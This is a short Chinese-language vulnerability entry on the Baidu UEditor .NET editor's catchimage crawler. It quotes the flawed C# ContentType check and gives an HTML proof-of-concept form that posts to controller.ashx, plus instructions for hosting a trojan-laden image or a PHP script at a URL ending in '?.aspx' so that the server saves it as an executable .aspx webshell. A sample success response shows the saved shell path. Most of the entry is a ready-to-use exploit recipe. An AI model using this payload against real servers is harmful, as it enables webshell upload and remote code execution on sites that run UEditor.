基本信息
---

项目地址
- https://github.com/fex-team/ueditor/

相关漏洞
---

- 文件上传 -> RCE
  - https://www.jianshu.com/p/6dae608b617c

https://github.com/fex-team/ueditor/blob/dev-1.5.0/net/App_Code/CrawlerHandler.cs
Crawler方法对source[]的检查仅仅是一个ContentType
```c#
 if (response.ContentType.IndexOf("image") == -1)
            {
                State = "Url is not an image";
                return this;
            }
```
并没有检查文件扩展名就直接保存到本地 导致getshell
POC:
```html
<form action="http://xx.com/editor/ueditor/net/controller.ashx?action=catchimage" enctype="multipart/form-data" method="POST">
  <p>shell addr: <input type="text" name="source[]" /></p>
  <input type="submit" value="Submit" />
</form>
```
shell addr 可以用http://www.xxx.com/xxx.jpg?.aspx的方式使用包含木马的图片（为了使服务器返回的ContentType是image/xxx）
也可以用http://www.xxxx.com/xxx.php?.aspx然后在xxx.php中自己设置ContentType

返回如下
```
{"state":"SUCCESS","list":[{"state":"SUCCESS","source":"http://www.xxxx.com//upload/Encyclopedias/201808/03/2018080300550278683.png?.aspx","url":"/upload/image/201808/03/6366885698033038502306919.aspx"}]}
```
